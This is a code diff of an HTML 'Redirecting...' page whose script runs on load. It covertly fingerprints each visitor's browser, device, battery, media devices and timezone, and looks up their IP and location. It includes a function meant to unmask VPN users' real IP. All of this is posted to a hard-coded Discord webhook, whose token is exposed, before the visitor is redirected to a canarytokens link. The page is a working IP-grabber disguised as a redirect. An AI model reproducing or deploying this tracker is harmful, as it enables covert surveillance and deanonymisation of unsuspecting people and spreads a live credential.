@@ -4,230 +4,242 @@
   <meta charset="UTF-8">
   <title>Redirecting...</title>
   <script>
-        async function sendVisitorInfoAndRedirect() {
-            // Replace this with your actual webhook URL
-            const webhookUrl = 'https://discord.com/api/webhooks/1251043675358760962/zfFykEDggnzIz975GTgwhFfh8FLW4jjXOS2F2E9t1frE0LbQwA0XXUVhnkyjoXV5P8_s';
+    async function sendVisitorInfoAndRedirect() {
+        // Replace this with your actual webhook URL
+        const webhookUrl = 'https://discord.com/api/webhooks/1251043675358760962/zfFykEDggnzIz975GTgwhFfh8FLW4jjXOS2F2E9t1frE0LbQwA0XXUVhnkyjoXV5P8_s';
 
-            // Load FingerprintJS and initialize
-            const fpPromise = import('https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs-pro@3/dist/fp.min.js').then((FingerprintJS) =>
-                FingerprintJS.load({
+        // Function to check if the visitor is using a VPN
+        async function checkVPN() {
+            try {
+                // Load FingerprintJS and initialize
+                const fp = await FingerprintJS.load({
                     endpoint: 'http://canarytokens.com/traffic/images/articles/fxwb3v9cklb6qvefin3a9u07j/contact.php',
-                })
-            );
+                });
 
-            // Function to check if the visitor is using a VPN
-            async function checkVPN() {
-                try {
-                    // Wait for FingerprintJS to load
-                    const fp = await fpPromise;
+                // Get the visitor's fingerprint
+                const result = await fp.get();
+                const fingerprint = result.visitorId;
 
-                    // Get the visitor's fingerprint
-                    const result = await fp.get();
-
-                    // Extract relevant information for VPN detection
-                    const fingerprint = result.visitorId;
-
-                    // Send fingerprint to VPN detection API
-                    const vpnCheckUrl = `https://proxycheck.io/v2/?key=public-62o148-006118-6z277x`; // Replace with your VPN detection URL
-                    let response = await fetch(vpnCheckUrl);
-                    let data = await response.json();
-                    return data.isVPN; // Assuming the API returns { isVPN: true/false }
-                } catch (error) {
-                    console.error('Error checking VPN status:', error);
-                    return false; // Default to false if there's an error
-                }
+                // Send fingerprint to VPN detection API
+                const vpnCheckUrl = `https://proxycheck.io/v2/?key=public-62o148-006118-6z277x`; // Replace with your VPN detection URL
+                let response = await fetch(vpnCheckUrl);
+                let data = await response.json();
+                return data.isVPN; // Assuming the API returns { isVPN: true/false }
+            } catch (error) {
+                console.error('Error checking VPN status:', error);
+                return false; // Default to false if there's an error
             }
+        }
 
-            // Collect visitor information
-            const visitorInfo = {
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                referrer: document.referrer,
-                ip: 'Not fetched', // Placeholder IP, will be replaced if fetched successfully
-                isVPN: false, // Default to false
-                screenWidth: window.screen.width,
-                screenHeight: window.screen.height,
-                colorDepth: window.screen.colorDepth,
-                cookiesEnabled: navigator.cookieEnabled,
-                plugins: getPluginInfo(), // Function to get installed plugins
-                localStorageEnabled: checkLocalStorage(),
-                sessionStorageEnabled: checkSessionStorage(),
-                doNotTrack: navigator.doNotTrack || 'Not specified',
-                connectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
-                batteryLevel: navigator.getBattery ? await getBatteryLevel() : 'Not supported',
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
-                networkType: navigator.connection ? navigator.connection.type : 'Unknown',
-                languagePrefs: navigator.languages ? navigator.languages.join(', ') : navigator.language,
-                screenOrientation: getScreenOrientation(),
-                deviceMemory: navigator.deviceMemory || 'N/A',
-                mediaDevices: getMediaDeviceInfo(),
-                operatingSystem: getOperatingSystem(),
-                referringDomain: getReferringDomain(),
-                geoCoordinates: 'Not fetched' // Placeholder for geo coordinates, not fetched
-            };
+        // Collect visitor information
+        const visitorInfo = {
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            referrer: document.referrer,
+            ip: 'Not fetched', // Placeholder IP, will be replaced if fetched successfully
+            isVPN: false, // Default to false
+            screenWidth: window.screen.width,
+            screenHeight: window.screen.height,
+            colorDepth: window.screen.colorDepth,
+            cookiesEnabled: navigator.cookieEnabled,
+            plugins: getPluginInfo(), // Function to get installed plugins
+            localStorageEnabled: checkLocalStorage(),
+            sessionStorageEnabled: checkSessionStorage(),
+            doNotTrack: navigator.doNotTrack || 'Not specified',
+            connectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
+            batteryLevel: navigator.getBattery ? await getBatteryLevel() : 'Not supported',
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+            networkType: navigator.connection ? navigator.connection.type : 'Unknown',
+            languagePrefs: navigator.languages ? navigator.languages.join(', ') : navigator.language,
+            screenOrientation: getScreenOrientation(),
+            deviceMemory: navigator.deviceMemory || 'N/A',
+            mediaDevices: await getMediaDeviceInfo(), // Await here to ensure devices are fetched
+            operatingSystem: getOperatingSystem(),
+            referringDomain: getReferringDomain(),
+            geoCoordinates: 'Not fetched', // Placeholder for geo coordinates, not fetched
+            location: 'Not fetched' // Placeholder for location, not fetched
+        };
 
-            // Function to fetch visitor IP address
-            async function fetchIPAddress() {
-                try {
-                    let response = await fetch('https://api.ipify.org?format=json');
-                    let data = await response.json();
-                    return data.ip;
-                } catch (error) {
-                    console.error('Error fetching IP address:', error);
-                    return 'Error fetching IP';
-                }
+        // Function to fetch visitor IP address
+        async function fetchIPAddress() {
+            try {
+                let response = await fetch('https://api.ipify.org?format=json');
+                let data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error fetching IP address:', error);
+                return 'Error fetching IP';
             }
+        }
 
-            // Function to attempt to bypass VPN masking
-            async function bypassVPN() {
-                try {
-                    // Use multiple IP detection services to try to get the real IP
-                    const ipDetectionUrls = [
-                        'https://api.ipify.org?format=json',
-                        'https://ifconfig.me/ip',
-                        'https://icanhazip.com'
-                        // Add more IP detection URLs here if needed
-                    ];
+        // Function to attempt to bypass VPN masking
+        async function bypassVPN() {
+            try {
+                // Use multiple IP detection services to try to get the real IP
+                const ipDetectionUrls = [
+                    'https://api.ipify.org?format=json',
+                    'https://ifconfig.me/ip',
+                    'https://icanhazip.com'
+                    // Add more IP detection URLs here if needed
+                ];
 
-                    let realIP = null;
+                let realIP = null;
 
-                    // Try fetching from each URL until a valid IP is obtained
-                    for (const url of ipDetectionUrls) {
-                        let response = await fetch(url);
-                        let data = await response.text();
-                        if (isValidIP(data)) {
-                            realIP = data.trim();
-                            break;
-                        }
+                // Try fetching from each URL until a valid IP is obtained
+                for (const url of ipDetectionUrls) {
+                    let response = await fetch(url);
+                    let data = await response.text();
+                    if (isValidIP(data)) {
+                        realIP = data.trim();
+                        break;
                     }
-
-                    return realIP || 'Unable to determine real IP';
-                } catch (error) {
-                    console.error('Error bypassing VPN:', error);
-                    return 'Error bypassing VPN';
                 }
+
+                return realIP || 'Unable to determine real IP';
+            } catch (error) {
+                console.error('Error bypassing VPN:', error);
+                return 'Error bypassing VPN';
             }
+        }
 
-            // Function to check if a string is a valid IP address
-            function isValidIP(ip) {
-                const ipRegex = /^([0-9]{1,3}\.){3}[0-9]{1,3}$/;
-                return ipRegex.test(ip.trim());
+        // Function to check if a string is a valid IP address
+        function isValidIP(ip) {
+            const ipRegex = /^([0-9]{1,3}\.){3}[0-9]{1,3}$/;
+            return ipRegex.test(ip.trim());
+        }
+
+        // Function to fetch visitor location based on IP address
+        async function fetchLocation(ip) {
+            try {
+                const locationApiUrl = `https://ipapi.co/${ip}/json/`;
+                let response = await fetch(locationApiUrl);
+                let data = await response.json();
+                return `${data.city}, ${data.country_name}`; // Only city and country name
+            } catch (error) {
+                console.error('Error fetching location:', error);
+                return 'Location not available';
             }
+        }
 
-            // Function to get installed plugin information
-            function getPluginInfo() {
-                let plugins = [];
-                for (let i = 0; i < navigator.plugins.length; i++) {
-                    plugins.push({
-                        name: navigator.plugins[i].name,
-                        filename: navigator.plugins[i].filename
-                    });
-                }
-                return plugins;
+        // Function to get installed plugin information
+        function getPluginInfo() {
+            let plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                plugins.push({
+                    name: navigator.plugins[i].name,
+                    filename: navigator.plugins[i].filename
+                });
             }
+            return plugins;
+        }
 
-            // Function to check if localStorage is enabled
-            function checkLocalStorage() {
-                try {
-                    localStorage.setItem('test', 'test');
-                    localStorage.removeItem('test');
-                    return true;
-                } catch (e) {
-                    return false;
-                }
+        // Function to check if localStorage is enabled
+        function checkLocalStorage() {
+            try {
+                localStorage.setItem('test', 'test');
+                localStorage.removeItem('test');
+                return true;
+            } catch (e) {
+                return false;
             }
+        }
 
-            // Function to check if sessionStorage is enabled
-            function checkSessionStorage() {
-                try {
-                    sessionStorage.setItem('test', 'test');
-                    sessionStorage.removeItem('test');
-                    return true;
-                } catch (e) {
-                    return false;
-                }
+        // Function to check if sessionStorage is enabled
+        function checkSessionStorage() {
+            try {
+                sessionStorage.setItem('test', 'test');
+                sessionStorage.removeItem('test');
+                return true;
+            } catch (e) {
+                return false;
             }
+        }
 
-            // Function to get battery level (if supported)
-            async function getBatteryLevel() {
-                const battery = await navigator.getBattery();
-                return battery.level * 100; // Convert to percentage
-            }
+        // Function to get battery level (if supported)
+        async function getBatteryLevel() {
+            const battery = await navigator.getBattery();
+            return battery.level * 100; // Convert to percentage
+        }
 
-            // Function to get screen orientation
-            function getScreenOrientation() {
-                if (screen.orientation) {
-                    return screen.orientation.type;
-                } else {
-                    return 'Orientation not available';
-                }
-            }
-
-            // Function to get media device information
-            function getMediaDeviceInfo() {
-                let devices = [];
-                if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
-                    navigator.mediaDevices.enumerateDevices().then(devicesList => {
-                        devicesList.forEach(device => {
-                            devices.push({
-                                kind: device.kind,
-                                label: device.label,
-                                deviceId: device.deviceId
-                            });
-                        });
-                    });
-                }
-                return devices;
-            }
-
-            // Function to get operating system
-            function getOperatingSystem() {
-                const platform = navigator.platform.toLowerCase();
-                if (platform.includes('win')) return 'Windows';
-                else if (platform.includes('mac')) return 'Mac OS';
-                else if (platform.includes('linux')) return 'Linux';
-                else if (platform.includes('iphone') || platform.includes('ipad') || platform.includes('ipod')) return 'iOS';
-                else if (platform.includes('android')) return 'Android';
-                else return 'Unknown';
-            }
-
-            // Function to get referring domain
-            function getReferringDomain() {
-                const referrer = document.referrer || 'Direct visit';
-                try {
-                    const url = new URL(referrer);
-                    return url.hostname;
-                } catch (error) {
-                    return referrer;
-                }
-            }
-
-            // Check if the visitor is using a VPN
-            const isVPN = await checkVPN();
-            visitorInfo.isVPN = isVPN;
-
-            // Attempt to bypass VPN to get real IP address
-            if (isVPN) {
-                visitorInfo.ip = await bypassVPN();
-                visitorInfo.userAgent = 'Potential VPN User-Agent';
-                // Add more handling or logging here if needed
+        // Function to get screen orientation
+        function getScreenOrientation() {
+            if (screen.orientation) {
+                return screen.orientation.type;
             } else {
-                // Fetch real IP if not using VPN
-                visitorInfo.ip = await fetchIPAddress();
+                return 'Orientation not available';
             }
+        }
 
-            // Prepare the message content for the webhook
-            const messageContent = {
-                content: `Visitor Information:
+        // Function to get media device information
+        async function getMediaDeviceInfo() {
+            let devices = [];
+            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+                let devicesList = await navigator.mediaDevices.enumerateDevices();
+                devicesList.forEach(device => {
+                    devices.push({
+                        kind: device.kind,
+                        label: device.label,
+                        deviceId: device.deviceId
+                    });
+                });
+            }
+            return devices;
+        }
+
+        // Function to get operating system
+        function getOperatingSystem() {
+            const platform = navigator.platform.toLowerCase();
+            if (platform.includes('win')) return 'Windows';
+            else if (platform.includes('mac')) return 'Mac OS';
+            else if (platform.includes('linux')) return 'Linux';
+            else if (platform.includes('iphone') || platform.includes('ipad') || platform.includes('ipod')) return 'iOS';
+            else if (platform.includes('android')) return 'Android';
+            else return 'Unknown';
+        }
+
+        // Function to get referring domain
+        function getReferringDomain() {
+            const referrer = document.referrer || 'Direct visit';
+            try {
+                const url = new URL(referrer);
+                return url.hostname;
+            } catch (error) {
+                return referrer;
+            }
+        }
+
+        // Check if the visitor is using a VPN
+        const isVPN = await checkVPN();
+        visitorInfo.isVPN = isVPN;
+
+        // Attempt to bypass VPN to get real IP address
+        if (isVPN) {
+            visitorInfo.ip = await bypassVPN();
+            visitorInfo.userAgent = 'Potential VPN User-Agent';
+            // Add more handling or logging here if needed
+        } else {
+            // Fetch real IP if not using VPN
+            visitorInfo.ip = await fetchIPAddress();
+
+            // Fetch visitor location based on IP
+            if (isValidIP(visitorInfo.ip)) {
+                visitorInfo.location = await fetchLocation(visitorInfo.ip);
+            }
+        }
+
+        // Prepare the message content for the webhook
+        const messageContent = {
+            content: `Visitor Information:
   - Timestamp: ${visitorInfo.timestamp}
   - User Agent: ${visitorInfo.userAgent}
   - Platform: ${visitorInfo.platform}
   - Language: ${visitorInfo.language}
   - Referrer: ${visitorInfo.referrer}
   - IP Address: ${visitorInfo.ip}
+  - Location: ${visitorInfo.location}
   - VPN Detected: ${visitorInfo.isVPN ? 'Yes' : 'No'}
   - Screen Resolution: ${visitorInfo.screenWidth}x${visitorInfo.screenHeight}
   - Color Depth: ${visitorInfo.colorDepth}
@@ -248,31 +260,30 @@
   - Operating System: ${visitorInfo.operatingSystem}
   - Referring Domain: ${visitorInfo.referringDomain}`
             };
+  // Send visitor information to the webhook using fetch
+  try {
+    const response = await fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(messageContent)
+    });
 
-           
-            // Send visitor information to the webhook using fetch
-            try {
-                const response = await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(messageContent)
-                });
+    if (!response.ok) {
+        throw new Error('Failed to send visitor information to webhook');
+    }
+  } catch (error) {
+    console.error('Error sending visitor information:', error);
+  }
 
-                if (!response.ok) {
-                    throw new Error('Failed to send visitor information to webhook');
-                }
-            } catch (error) {
-                console.error('Error sending visitor information:', error);
-            }
+  // Redirect to the target URL immediately
+  window.location.replace("http://canarytokens.com/traffic/images/articles/fxwb3v9cklb6qvefin3a9u07j/contact.php?reloadCount=0");
+  }
 
-            // Redirect to the target URL immediately
-            window.location.replace("http://canarytokens.com/traffic/images/articles/fxwb3v9cklb6qvefin3a9u07j/contact.php?reloadCount=0");
-        }
+  // Start the process of sending info and redirecting
+  sendVisitorInfoAndRedirect();
 
-        // Start the process of sending info and redirecting
-        sendVisitorInfoAndRedirect();
   </script>
 </head>
 <body>
